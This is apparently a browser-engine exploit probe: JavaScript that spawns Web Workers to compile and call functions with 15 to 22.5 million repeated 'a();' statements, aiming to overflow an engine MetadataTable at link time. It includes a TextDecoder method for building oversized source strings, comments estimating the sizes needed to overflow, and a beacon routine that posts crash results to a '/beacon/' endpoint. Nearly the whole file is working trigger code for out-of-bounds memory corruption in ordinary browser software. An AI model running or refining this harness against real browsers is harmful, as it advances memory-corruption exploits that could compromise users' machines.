// p135 — MetadataTable overflow via Worker compilation
// The overflow happens at FIRST CALL (link time), not compile time.
// Workers crash independently — main thread survives to report.
//
// Key insight from DS V4 Pro CE UAF analysis:
//   op_call metadata = 96 bytes (upstream tree)
//   With param 'a': each 'a();' = 1 op_call = 96B metadata
//     → need 44.7M repeats = 179MB (too large)
//   Without param: each 'a();' = resolve_scope + get_from_scope + call
//     = ~168B metadata per 4 source bytes
//     → need ~25.6M repeats = ~103MB (still too large)
//   BUT: wk1200 metadata structs may be LARGER than upstream
//     If total metadata per no-param 'a();' >= 215B:
//     → 20M repeats (80MB) would overflow!
//
// Strategy: test both with-param and no-param at 20M repeats
// Use Workers for crash isolation
//
// Beacon prefix: V135W-
(function(){
var rid='v135w'+Math.random().toString(36).slice(2,12);
function beacon(tag,data){
  var body=typeof data==='object'?JSON.stringify(data):String(data);
  try{navigator.sendBeacon('/beacon/V135W-'+tag,JSON.stringify({r:rid,b:body}));}catch(e){}
  try{fetch('/beacon/V135W-'+tag,{method:'POST',body:JSON.stringify({r:rid,b:body}),keepalive:true}).catch(function(){});}catch(e2){}
}
beacon('L','probe135-start');

function runWorkerTest(testName, workerCode, timeoutMs){
  return new Promise(function(resolve){
    var result={test:testName};
    var t0=Date.now();
    try{
      var blob=new Blob([workerCode],{type:'application/javascript'});
      var url=URL.createObjectURL(blob);
      var w=new Worker(url);
      var done=false;

      w.onmessage=function(e){
        if(done)return;
        var d=e.data;
        if(d.type==='progress'){
          result[d.phase]=d.value;
          beacon(testName+'-PROG',d.phase+':'+JSON.stringify(d.value));
        }else if(d.type==='done'){
          done=true;
          result.workerResult=d.value;
          result.survived=true;
          result.totalTime=Date.now()-t0;
          w.terminate();
          URL.revokeObjectURL(url);
          resolve(result);
        }
      };

      w.onerror=function(e){
        if(done)return;
        done=true;
        result.crashed=true;
        result.errorMsg=e.message?String(e.message).slice(0,120):'unknown';
        result.errorLine=e.lineno;
        result.totalTime=Date.now()-t0;
        try{w.terminate();}catch(x){}
        URL.revokeObjectURL(url);
        resolve(result);
      };

      setTimeout(function(){
        if(done)return;
        done=true;
        result.timedOut=true;
        result.totalTime=Date.now()-t0;
        try{w.terminate();}catch(x){}
        URL.revokeObjectURL(url);
        resolve(result);
      },timeoutMs||120000);

    }catch(e){
      result.setupErr=e.constructor.name+':'+String(e.message||'').slice(0,80);
      resolve(result);
    }
  });
}

// ======== W1: WITH param, 20M repeats — compile only (baseline) ========
var W1_CODE=`
self.postMessage({type:'progress',phase:'start',value:Date.now()});
try{
  var t0=Date.now();
  var src='a();'.repeat(20000000);
  self.postMessage({type:'progress',phase:'stringDone',value:{len:src.length,ms:Date.now()-t0}});
  var t1=Date.now();
  var fn=new Function('a',src);
  self.postMessage({type:'progress',phase:'compileDone',value:{ms:Date.now()-t1}});
  src=null;
  self.postMessage({type:'done',value:{compiled:true,compileMs:Date.now()-t1}});
}catch(e){
  self.postMessage({type:'done',value:{err:e.constructor.name+':'+String(e.message||'').slice(0,80)}});
}
`;

// ======== W2: WITHOUT param, 20M repeats — compile only ========
var W2_CODE=`
self.postMessage({type:'progress',phase:'start',value:Date.now()});
try{
  var t0=Date.now();
  var src='a();'.repeat(20000000);
  self.postMessage({type:'progress',phase:'stringDone',value:{len:src.length,ms:Date.now()-t0}});
  var t1=Date.now();
  var fn=new Function(src);
  self.postMessage({type:'progress',phase:'compileDone',value:{ms:Date.now()-t1}});
  src=null;
  self.postMessage({type:'done',value:{compiled:true,noParam:true,compileMs:Date.now()-t1}});
}catch(e){
  self.postMessage({type:'done',value:{err:e.constructor.name+':'+String(e.message||'').slice(0,80)}});
}
`;

// ======== W3: WITH param, 20M repeats — compile AND CALL ========
// The call triggers link() which is where the OOB happens
var W3_CODE=`
self.postMessage({type:'progress',phase:'start',value:Date.now()});
try{
  var t0=Date.now();
  var src='a();'.repeat(20000000);
  self.postMessage({type:'progress',phase:'stringDone',value:{len:src.length,ms:Date.now()-t0}});
  var t1=Date.now();
  var fn=new Function('a',src);
  var compileMs=Date.now()-t1;
  self.postMessage({type:'progress',phase:'compileDone',value:{ms:compileMs}});
  src=null;
  // Free memory before call
  for(var g=0;g<10;g++){var tmp=new ArrayBuffer(4194304);tmp=null;}
  self.postMessage({type:'progress',phase:'calling',value:'now'});
  // CALL IT — this triggers CodeBlock creation → link() → potential OOB
  var callCount=0;
  try{
    fn(function(){
      callCount++;
      if(callCount>2) throw new Error('STOP');
    });
  }catch(e){
    if(e.message==='STOP'){
      self.postMessage({type:'done',value:{compiled:true,called:true,callCount:callCount,compileMs:compileMs}});
      return;
    }
    self.postMessage({type:'done',value:{compiled:true,callErr:e.constructor.name+':'+String(e.message||'').slice(0,60),callCount:callCount,compileMs:compileMs}});
    return;
  }
  self.postMessage({type:'done',value:{compiled:true,called:true,callCount:callCount,compileMs:compileMs}});
}catch(e){
  self.postMessage({type:'done',value:{err:e.constructor.name+':'+String(e.message||'').slice(0,80)}});
}
`;

// ======== W4: WITHOUT param, 20M repeats — compile AND CALL ========
// If metadata per no-param a(); >= 215 bytes, this overflows!
var W4_CODE=`
self.postMessage({type:'progress',phase:'start',value:Date.now()});
try{
  var t0=Date.now();
  var src='a();'.repeat(20000000);
  self.postMessage({type:'progress',phase:'stringDone',value:{len:src.length,ms:Date.now()-t0}});
  var t1=Date.now();
  var fn=new Function(src);
  var compileMs=Date.now()-t1;
  self.postMessage({type:'progress',phase:'compileDone',value:{ms:compileMs}});
  src=null;
  for(var g=0;g<10;g++){var tmp=new ArrayBuffer(4194304);tmp=null;}
  self.postMessage({type:'progress',phase:'calling',value:'now'});
  try{
    fn();
  }catch(e){
    // ReferenceError expected if a is not defined
    self.postMessage({type:'done',value:{compiled:true,called:true,callErr:e.constructor.name+':'+String(e.message||'').slice(0,60),noParam:true,compileMs:compileMs}});
    return;
  }
  self.postMessage({type:'done',value:{compiled:true,called:true,noParam:true,compileMs:compileMs}});
}catch(e){
  self.postMessage({type:'done',value:{err:e.constructor.name+':'+String(e.message||'').slice(0,80)}});
}
`;

// ======== W5: WITHOUT param, 15M repeats (60MB) — compile AND CALL ========
// Lower bound test
var W5_CODE=`
self.postMessage({type:'progress',phase:'start',value:Date.now()});
try{
  var t0=Date.now();
  var src='a();'.repeat(15000000);
  self.postMessage({type:'progress',phase:'stringDone',value:{len:src.length,ms:Date.now()-t0}});
  var t1=Date.now();
  var fn=new Function(src);
  var compileMs=Date.now()-t1;
  self.postMessage({type:'progress',phase:'compileDone',value:{ms:compileMs}});
  src=null;
  for(var g=0;g<10;g++){var tmp=new ArrayBuffer(4194304);tmp=null;}
  self.postMessage({type:'progress',phase:'calling',value:'now'});
  try{
    fn();
  }catch(e){
    self.postMessage({type:'done',value:{compiled:true,called:true,callErr:e.constructor.name+':'+String(e.message||'').slice(0,60),n:'15M',compileMs:compileMs}});
    return;
  }
  self.postMessage({type:'done',value:{compiled:true,called:true,n:'15M',compileMs:compileMs}});
}catch(e){
  self.postMessage({type:'done',value:{err:e.constructor.name+':'+String(e.message||'').slice(0,80)}});
}
`;

// ======== W6: TextDecoder approach — build 90MB string from TypedArray ========
// Bypass String.repeat() limit by using TypedArray → TextDecoder
var W6_CODE=`
self.postMessage({type:'progress',phase:'start',value:Date.now()});
try{
  var N=22500000; // 90MB
  var t0=Date.now();
  var buf=new Uint8Array(N*4);
  for(var i=0;i<buf.length;i+=4){
    buf[i]=97;   // a
    buf[i+1]=40; // (
    buf[i+2]=41; // )
    buf[i+3]=59; // ;
  }
  var fillMs=Date.now()-t0;
  self.postMessage({type:'progress',phase:'bufferFilled',value:{len:buf.length,ms:fillMs}});
  var t1=Date.now();
  var src=new TextDecoder().decode(buf);
  buf=null; // free TypedArray
  var decodeMs=Date.now()-t1;
  self.postMessage({type:'progress',phase:'decoded',value:{srcLen:src.length,ms:decodeMs}});
  var t2=Date.now();
  var fn=new Function('a',src);
  var compileMs=Date.now()-t2;
  self.postMessage({type:'progress',phase:'compiled',value:{ms:compileMs}});
  src=null;
  self.postMessage({type:'done',value:{compiled:true,n:N,fillMs:fillMs,decodeMs:decodeMs,compileMs:compileMs}});
}catch(e){
  self.postMessage({type:'done',value:{err:e.constructor.name+':'+String(e.message||'').slice(0,80),n:22500000}});
}
`;

async function runAll(){
  var tests=[
    {name:'W1-PARAM-20M-COMPILE',code:W1_CODE,timeout:90000},
    {name:'W2-NOPARAM-20M-COMPILE',code:W2_CODE,timeout:90000},
    {name:'W3-PARAM-20M-CALL',code:W3_CODE,timeout:120000},
    {name:'W4-NOPARAM-20M-CALL',code:W4_CODE,timeout:120000},
    {name:'W5-NOPARAM-15M-CALL',code:W5_CODE,timeout:90000},
    {name:'W6-TEXTDEC-22M',code:W6_CODE,timeout:120000}
  ];

  for(var i=0;i<tests.length;i++){
    beacon(tests[i].name+'-PRE','starting');
    var result=await runWorkerTest(tests[i].name,tests[i].code,tests[i].timeout);
    beacon(tests[i].name,result);
    // GC pause between tests
    for(var g=0;g<20;g++){var tmp=new ArrayBuffer(4194304);tmp=null;}
    await new Promise(function(r){setTimeout(r,5000);});
    for(var g2=0;g2<20;g2++){var tmp2=new ArrayBuffer(4194304);tmp2=null;}
  }
  beacon('DONE','all-'+tests.length);
}
runAll();
})();
